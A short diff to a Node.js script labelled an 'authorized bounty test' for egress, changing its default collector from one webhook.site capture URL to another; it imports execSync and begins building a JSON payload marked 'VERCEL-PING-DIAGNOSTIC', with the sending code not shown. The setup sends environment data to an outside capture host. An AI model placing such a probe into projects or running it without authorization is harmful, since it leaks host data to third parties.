@@ -1,7 +1,7 @@
 // Minimal diagnostic — authorized bounty test. Checks if egress works.
 import { execSync } from "node:child_process";
 
-const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/f5861d76-4ccc-4b6b-817c-803cb8806962";
+const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac";
 
 const payload = JSON.stringify({
   marker: "VERCEL-PING-DIAGNOSTIC",
